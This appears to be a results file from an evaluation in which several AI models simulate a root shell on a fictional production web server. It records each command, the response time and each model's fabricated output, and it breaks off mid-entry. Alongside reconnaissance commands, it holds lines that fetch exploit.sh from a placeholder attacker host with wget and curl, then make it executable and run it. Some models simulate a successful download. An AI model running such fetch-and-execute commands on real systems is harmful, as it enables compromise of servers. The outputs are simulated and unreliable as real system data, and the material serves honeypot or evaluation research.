@@ -1,0 +1,2977 @@
+
+
+========================================
+--- START OF: 1-deepseek.txt ---
+========================================
+
+1-deepseek.txt
+Command: uname -a
+Response Time: 20.37 seconds
+
+Response:
+Linux prod-web-nyc-01 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:14 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 1-deepseek.txt ---
+
+
+========================================
+--- START OF: 1-gemini.txt ---
+========================================
+
+1-gemini.txt
+Command: uname -a
+Response Time: 2.71 seconds
+
+Response:
+Linux prod-web-nyc-01 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:14 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 1-gemini.txt ---
+
+
+========================================
+--- START OF: 1-gpt.txt ---
+========================================
+
+1-gpt.txt
+Command: uname -a
+Response Time: 7.89 seconds
+
+Response:
+Linux prod-web-nyc-01 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:14 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 1-gpt.txt ---
+
+
+========================================
+--- START OF: 1-llama.txt ---
+========================================
+
+1-llama.txt
+Command: uname -a
+Response Time: 3.56 seconds
+
+Response:
+Linux prod-web-nyc-01 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:14 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 1-llama.txt ---
+
+
+========================================
+--- START OF: 1-sonnet.txt ---
+========================================
+
+1-sonnet.txt
+Command: uname -a
+Response Time: 3.89 seconds
+
+Response:
+Linux prod-web-nyc-01 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:14 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 1-sonnet.txt ---
+
+
+========================================
+--- START OF: 10-deepseek.txt ---
+========================================
+
+10-deepseek.txt
+Command: ifconfig
+Response Time: 39.55 seconds
+
+Response:
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.1.15  netmask 255.255.255.0  broadcast 10.0.1.255
+        inet6 fe80::250:56ff:fe89:1234  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:89:12:34  txqueuelen 1000  (Ethernet)
+        RX packets 245678  bytes 345678901 (345.6 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 123456  bytes 234567890 (234.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 1234  bytes 123456 (123.4 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1234  bytes 123456 (123.4 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 10-deepseek.txt ---
+
+
+========================================
+--- START OF: 10-gemini.txt ---
+========================================
+
+10-gemini.txt
+Command: ifconfig
+Response Time: 6.38 seconds
+
+Response:
+Command 'ifconfig' not found, but can be installed with:
+apt install net-tools
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 10-gemini.txt ---
+
+
+========================================
+--- START OF: 10-gpt.txt ---
+========================================
+
+10-gpt.txt
+Command: ifconfig
+Response Time: 28.55 seconds
+
+Response:
+ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 203.0.113.23  netmask 255.255.255.0  broadcast 203.0.113.255
+        inet6 2001:db8:100:200::23  prefixlen 64  scopeid 0x0<global>
+        inet6 fe80::5054:ff:fe12:3456  prefixlen 64  scopeid 0x20<link>
+        ether 52:54:00:12:34:56  txqueuelen 1000  (Ethernet)
+        RX packets 12567890  bytes 1876543210 (1.8 GB)
+        RX errors 0  dropped 12  overruns 0  frame 0
+        TX packets 11345678  bytes 1654321098 (1.6 GB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 234567  bytes 18901234 (18.9 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 234567  bytes 18901234 (18.9 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 10-gpt.txt ---
+
+
+========================================
+--- START OF: 10-llama.txt ---
+========================================
+
+10-llama.txt
+Command: ifconfig
+Response Time: 17.72 seconds
+
+Response:
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.100  netmask 255.255.255.0  broadcast 10.0.0.255
+        inet6 fe80::250:56ff:feaf:3164  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:af:31:64  txqueuelen 1000  (Ethernet)
+        RX packets 23456789  bytes 1234567890 (1.1 G)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 12345678  bytes 901234567 (860.1 M)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 12345  bytes 678901 (662.4 K)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 12345  bytes 678901 (662.4 K)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 10-llama.txt ---
+
+
+========================================
+--- START OF: 10-sonnet.txt ---
+========================================
+
+10-sonnet.txt
+Command: ifconfig
+Response Time: 8.72 seconds
+
+Response:
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.142.0.15  netmask 255.255.255.0  broadcast 10.142.0.255
+        inet6 fe80::4001:aff:fe8e:f  prefixlen 64  scopeid 0x20<link>
+        ether 42:01:0a:8e:00:0f  txqueuelen 1000  (Ethernet)
+        RX packets 284763  bytes 392847562 (392.8 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 198452  bytes 156734829 (156.7 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 12847  bytes 1847293 (1.8 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 12847  bytes 1847293 (1.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 10-sonnet.txt ---
+
+
+========================================
+--- START OF: 11-deepseek.txt ---
+========================================
+
+11-deepseek.txt
+Command: ip a
+Response Time: 29.18 seconds
+
+Response:
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 52:54:00:ab:cd:ef brd ff:ff:ff:ff:ff:ff
+    inet 10.0.1.15/24 brd 10.0.1.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::5054:ff:feab:cdef/64 scope link 
+       valid_lft forever preferred_lft forever
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 11-deepseek.txt ---
+
+
+========================================
+--- START OF: 11-gemini.txt ---
+========================================
+
+11-gemini.txt
+Command: ip a
+Response Time: 16.68 seconds
+
+Response:
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 52:54:00:a1:b2:c3 brd ff:ff:ff:ff:ff:ff
+    inet 138.197.100.201/24 brd 138.197.100.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 2604:a880:800:10::1234:5001/64 scope global 
+       valid_lft forever preferred_lft forever
+    inet6 fe80::5054:ff:fea1:b2c3/64 scope link 
+       valid_lft forever preferred_lft forever
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 11-gemini.txt ---
+
+
+========================================
+--- START OF: 11-gpt.txt ---
+========================================
+
+11-gpt.txt
+Command: ip a
+Response Time: 33.98 seconds
+
+Response:
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:ab:cd:ef brd ff:ff:ff:ff:ff:ff
+    inet 10.42.12.15/24 brd 10.42.12.255 scope global dynamic noprefixroute ens160
+       valid_lft 86123sec preferred_lft 86123sec
+    inet6 fe80::250:56ff:feab:cdef/64 scope link
+       valid_lft forever preferred_lft forever
+3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:2a:3b:4c:5d brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:2aff:fe3b:4c5d/64 scope link
+       valid_lft forever preferred_lft forever
+4: veth1a2b3c@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default
+    link/ether 0a:58:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::858:acff:fe11:2/64 scope link
+       valid_lft forever preferred_lft forever
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 11-gpt.txt ---
+
+
+========================================
+--- START OF: 11-llama.txt ---
+========================================
+
+11-llama.txt
+Command: ip a
+Response Time: 12.61 seconds
+
+Response:
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:acff:fe11:2/64 scope link 
+       valid_lft forever preferred_lft forever
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 11-llama.txt ---
+
+
+========================================
+--- START OF: 11-sonnet.txt ---
+========================================
+
+11-sonnet.txt
+Command: ip a
+Response Time: 7.86 seconds
+
+Response:
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 02:42:ac:11:00:05 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.5/24 brd 172.17.0.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:acff:fe11:5/64 scope link 
+       valid_lft forever preferred_lft forever
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 11-sonnet.txt ---
+
+
+========================================
+--- START OF: 12-deepseek.txt ---
+========================================
+
+12-deepseek.txt
+Command: sudo -l
+Response Time: 21.25 seconds
+
+Response:
+Matching Defaults entries for root on prod-web-nyc-01:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on prod-web-nyc-01:
+    (ALL : ALL) ALL
+
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 12-deepseek.txt ---
+
+
+========================================
+--- START OF: 12-gemini.txt ---
+========================================
+
+12-gemini.txt
+Command: sudo -l
+Response Time: 6.16 seconds
+
+Response:
+Matching Defaults entries for root on prod-web-nyc-01:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on prod-web-nyc-01:
+    (ALL : ALL) ALL
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 12-gemini.txt ---
+
+
+========================================
+--- START OF: 12-gpt.txt ---
+========================================
+
+12-gpt.txt
+Command: sudo -l
+Response Time: 19.14 seconds
+
+Response:
+Matching Defaults entries for root on prod-web-nyc-01:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
+    env_keep+="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"
+
+User root may run the following commands on prod-web-nyc-01:
+    (ALL : ALL) ALL
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 12-gpt.txt ---
+
+
+========================================
+--- START OF: 12-llama.txt ---
+========================================
+
+12-llama.txt
+Command: sudo -l
+Response Time: 4.64 seconds
+
+Response:
+Matching Defaults entries for root on prod-web-nyc-01:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on prod-web-nyc-01:
+    (ALL : ALL) ALL
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 12-llama.txt ---
+
+
+========================================
+--- START OF: 12-sonnet.txt ---
+========================================
+
+12-sonnet.txt
+Command: sudo -l
+Response Time: 4.69 seconds
+
+Response:
+Matching Defaults entries for root on prod-web-nyc-01:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User root may run the following commands on prod-web-nyc-01:
+    (ALL : ALL) ALL
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 12-sonnet.txt ---
+
+
+========================================
+--- START OF: 13-deepseek.txt ---
+========================================
+
+13-deepseek.txt
+Command: history
+Response Time: 17.96 seconds
+
+Response:
+    1  whoami
+    2  uname -a
+    3  history
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 13-deepseek.txt ---
+
+
+========================================
+--- START OF: 13-gemini.txt ---
+========================================
+
+13-gemini.txt
+Command: history
+Response Time: 4.54 seconds
+
+Response:
+  1  whoami
+  2  uname -a
+  3  history
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 13-gemini.txt ---
+
+
+========================================
+--- START OF: 13-gpt.txt ---
+========================================
+
+13-gpt.txt
+Command: history
+Response Time: 18.64 seconds
+
+Response:
+  1  whoami
+  2  uname -a
+  3  history
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 13-gpt.txt ---
+
+
+========================================
+--- START OF: 13-llama.txt ---
+========================================
+
+13-llama.txt
+Command: history
+Response Time: 1.93 seconds
+
+Response:
+    1  whoami
+    2  uname -a
+    3  history
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 13-llama.txt ---
+
+
+========================================
+--- START OF: 13-sonnet.txt ---
+========================================
+
+13-sonnet.txt
+Command: history
+Response Time: 6.83 seconds
+
+Response:
+    1  apt update
+    2  systemctl status nginx
+    3  systemctl restart nginx
+    4  tail -f /var/log/nginx/access.log
+    5  df -h
+    6  free -m
+    7  top
+    8  ps aux | grep nginx
+    9  netstat -tulpn
+   10  cd /var/www/html
+   11  ls -la
+   12  cat /etc/nginx/sites-available/default
+   13  journalctl -u nginx -n 50
+   14  systemctl status mysql
+   15  mysql -u root -p
+   16  du -sh /var/log/*
+   17  find /var/log -name "*.gz" -type f -delete
+   18  whoami
+   19  uname -a
+   20  history
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 13-sonnet.txt ---
+
+
+========================================
+--- START OF: 14-deepseek.txt ---
+========================================
+
+14-deepseek.txt
+Command: find / -perm -u=s -type f 2>/dev/null
+Response Time: 18.54 seconds
+
+Response:
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/umount
+/bin/su
+/bin/ping
+/usr/lib/openssh/ssh-keysign
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 14-deepseek.txt ---
+
+
+========================================
+--- START OF: 14-gemini.txt ---
+========================================
+
+14-gemini.txt
+Command: find / -perm -u=s -type f 2>/dev/null
+Response Time: 11.33 seconds
+
+Response:
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/pkexec
+/bin/mount
+/bin/umount
+/bin/su
+/bin/ping
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 14-gemini.txt ---
+
+
+========================================
+--- START OF: 14-gpt.txt ---
+========================================
+
+14-gpt.txt
+Command: find / -perm -u=s -type f 2>/dev/null
+Response Time: 96.17 seconds
+
+Response:
+/usr/bin/chage
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/crontab
+/usr/bin/fusermount3
+/usr/bin/gpasswd
+/usr/bin/mtr-packet
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/sudo
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/snapd/snap-confine.real
+/usr/lib/x86_64-linux-gnu/samba/smbspool_krb5_wrapper
+/usr/sbin/pam_timestamp_check
+/usr/sbin/pppd
+/usr/sbin/unix_chkpwd
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 14-gpt.txt ---
+
+
+========================================
+--- START OF: 14-llama.txt ---
+========================================
+
+14-llama.txt
+Command: find / -perm -u=s -type f 2>/dev/null
+Response Time: 5.28 seconds
+
+Response:
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/chsh
+/bin/fusermount
+/bin/mount
+/bin/umount
+/bin/su
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 14-llama.txt ---
+
+
+========================================
+--- START OF: 14-sonnet.txt ---
+========================================
+
+14-sonnet.txt
+Command: find / -perm -u=s -type f 2>/dev/null
+Response Time: 7.16 seconds
+
+Response:
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/libexec/polkit-agent-helper-1
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/umount
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 14-sonnet.txt ---
+
+
+========================================
+--- START OF: 15-deepseek.txt ---
+========================================
+
+15-deepseek.txt
+Command: sudo su
+Response Time: 20.75 seconds
+
+Response:
+root@prod-web-nyc-01:~# sudo su
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 15-deepseek.txt ---
+
+
+========================================
+--- START OF: 15-gemini.txt ---
+========================================
+
+15-gemini.txt
+Command: sudo su
+Response Time: 5.57 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 15-gemini.txt ---
+
+
+========================================
+--- START OF: 15-gpt.txt ---
+========================================
+
+15-gpt.txt
+Command: sudo su
+Response Time: 13.71 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 15-gpt.txt ---
+
+
+========================================
+--- START OF: 15-llama.txt ---
+========================================
+
+15-llama.txt
+Command: sudo su
+Response Time: 0.94 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 15-llama.txt ---
+
+
+========================================
+--- START OF: 15-sonnet.txt ---
+========================================
+
+15-sonnet.txt
+Command: sudo su
+Response Time: 5.11 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 15-sonnet.txt ---
+
+
+========================================
+--- START OF: 16-deepseek.txt ---
+========================================
+
+16-deepseek.txt
+Command: wget http://<attacker-ip>/exploit.sh
+Response Time: 20.00 seconds
+
+Response:
+--2024-01-15 10:30:00--  http://<attacker-ip>/exploit.sh
+Resolving <attacker-ip> (<attacker-ip>)... failed: Name or service not known.
+wget: unable to resolve host address '<attacker-ip>'
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 16-deepseek.txt ---
+
+
+========================================
+--- START OF: 16-gemini.txt ---
+========================================
+
+16-gemini.txt
+Command: wget http://<attacker-ip>/exploit.sh
+Response Time: 16.67 seconds
+
+Response:
+--2024-05-21 15:10:21--  http://<attacker-ip>/exploit.sh
+Resolving <attacker-ip> (<attacker-ip>)... failed: Name or service not known.
+wget: unable to resolve host address ‘<attacker-ip>’
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 16-gemini.txt ---
+
+
+========================================
+--- START OF: 16-gpt.txt ---
+========================================
+
+16-gpt.txt
+Command: wget http://<attacker-ip>/exploit.sh
+Response Time: 29.33 seconds
+
+Response:
+bash: attacker-ip: No such file or directory
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 16-gpt.txt ---
+
+
+========================================
+--- START OF: 16-llama.txt ---
+========================================
+
+16-llama.txt
+Command: wget http://<attacker-ip>/exploit.sh
+Response Time: 6.65 seconds
+
+Response:
+--2023-02-20 14:30:15--  http://<attacker-ip>/exploit.sh
+Connecting to <attacker-ip>:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4032 (3.9K) [text/x-sh]
+Saving to: ‘exploit.sh’
+
+     0K ...                                                   100%  633M=0s
+
+2023-02-20 14:30:15 (633 MB/s) - ‘exploit.sh’ saved [4032/4032]
+
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 16-llama.txt ---
+
+
+========================================
+--- START OF: 16-sonnet.txt ---
+========================================
+
+16-sonnet.txt
+Command: wget http://<attacker-ip>/exploit.sh
+Response Time: 6.78 seconds
+
+Response:
+I can't help with simulating cyberattacks or malicious activities, even in a roleplay scenario. This includes downloading exploit scripts to compromise systems.
+
+If you're interested in learning about cybersecurity, I'd be happy to discuss legitimate topics like:
+- Defensive security practices
+- Authorized penetration testing in controlled environments
+- System administration and hardening
+- Security concepts and principles
+
+
+--- END OF: 16-sonnet.txt ---
+
+
+========================================
+--- START OF: 17-deepseek.txt ---
+========================================
+
+17-deepseek.txt
+Command: curl -o exploit.sh http://<attacker-ip>/exploit.sh
+Response Time: 58.03 seconds
+
+Response:
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1024  100  1024    0     0   1024k      0 --:--:-- --:--:-- --:--:-- 1024k
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 17-deepseek.txt ---
+
+
+========================================
+--- START OF: 17-gemini.txt ---
+========================================
+
+17-gemini.txt
+Command: curl -o exploit.sh http://<attacker-ip>/exploit.sh
+Response Time: 15.03 seconds
+
+Response:
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  5215  100  5215    0     0  15.3M      0 --:--:-- --:--:-- --:--:-- 15.3M
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 17-gemini.txt ---
+
+
+========================================
+--- START OF: 17-gpt.txt ---
+========================================
+
+17-gpt.txt
+Command: curl -o exploit.sh http://<attacker-ip>/exploit.sh
+Response Time: 25.60 seconds
+
+Response:
+bash: attacker-ip: No such file or directory
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 17-gpt.txt ---
+
+
+========================================
+--- START OF: 17-llama.txt ---
+========================================
+
+17-llama.txt
+Command: curl -o exploit.sh http://<attacker-ip>/exploit.sh
+Response Time: 4.66 seconds
+
+Response:
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3424  100  3424    0     0  3343k      0 --:--:-- --:--:-- --:--:-- 3343k
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 17-llama.txt ---
+
+
+========================================
+--- START OF: 17-sonnet.txt ---
+========================================
+
+17-sonnet.txt
+Command: curl -o exploit.sh http://<attacker-ip>/exploit.sh
+Response Time: 9.92 seconds
+
+Response:
+curl: (6) Could not resolve host: <attacker-ip>
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 17-sonnet.txt ---
+
+
+========================================
+--- START OF: 18-deepseek.txt ---
+========================================
+
+18-deepseek.txt
+Command: chmod +x exploit.sh
+Response Time: 20.90 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 18-deepseek.txt ---
+
+
+========================================
+--- START OF: 18-gemini.txt ---
+========================================
+
+18-gemini.txt
+Command: chmod +x exploit.sh
+Response Time: 1.51 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 18-gemini.txt ---
+
+
+========================================
+--- START OF: 18-gpt.txt ---
+========================================
+
+18-gpt.txt
+Command: chmod +x exploit.sh
+Response Time: 10.77 seconds
+
+Response:
+chmod: cannot access 'exploit.sh': No such file or directory
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 18-gpt.txt ---
+
+
+========================================
+--- START OF: 18-llama.txt ---
+========================================
+
+18-llama.txt
+Command: chmod +x exploit.sh
+Response Time: 0.99 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 18-llama.txt ---
+
+
+========================================
+--- START OF: 18-sonnet.txt ---
+========================================
+
+18-sonnet.txt
+Command: chmod +x exploit.sh
+Response Time: 4.29 seconds
+
+Response:
+chmod: cannot access 'exploit.sh': No such file or directory
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 18-sonnet.txt ---
+
+
+========================================
+--- START OF: 19-deepseek.txt ---
+========================================
+
+19-deepseek.txt
+Command: ./exploit.sh
+Response Time: 22.51 seconds
+
+Response:
+bash: ./exploit.sh: No such file or directory
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 19-deepseek.txt ---
+
+
+========================================
+--- START OF: 19-gemini.txt ---
+========================================
+
+19-gemini.txt
+Command: ./exploit.sh
+Response Time: 5.55 seconds
+
+Response:
+bash: ./exploit.sh: No such file or directory
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 19-gemini.txt ---
+
+
+========================================
+--- START OF: 19-gpt.txt ---
+========================================
+
+19-gpt.txt
+Command: ./exploit.sh
+Response Time: 9.79 seconds
+
+Response:
+bash: ./exploit.sh: No such file or directory
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 19-gpt.txt ---
+
+
+========================================
+--- START OF: 19-llama.txt ---
+========================================
+
+19-llama.txt
+Command: ./exploit.sh
+Response Time: 1.50 seconds
+
+Response:
+bash: ./exploit.sh: No such file or directory
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 19-llama.txt ---
+
+
+========================================
+--- START OF: 19-sonnet.txt ---
+========================================
+
+19-sonnet.txt
+Command: ./exploit.sh
+Response Time: 5.05 seconds
+
+Response:
+bash: ./exploit.sh: No such file or directory
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 19-sonnet.txt ---
+
+
+========================================
+--- START OF: 2-deepseek.txt ---
+========================================
+
+2-deepseek.txt
+Command: whoami
+Response Time: 11.27 seconds
+
+Response:
+root
